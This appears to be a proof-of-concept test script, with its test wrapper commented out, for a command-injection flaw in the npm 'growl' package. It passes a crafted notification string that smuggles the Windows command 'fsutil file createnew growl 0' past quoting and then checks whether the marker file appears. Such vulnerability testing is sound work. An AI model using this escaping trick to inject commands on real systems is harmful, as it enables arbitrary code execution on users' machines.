// test("Command Injection in growl", (done) => {
//   expect.assertions(2);
  const growl = require("growl");
  const fs = require("fs");
  const path = "./growl";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  growl('"\"\"fsutil file createnew growl 0"\"\"', {}, () => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {
//       done();
    });
  });
// });
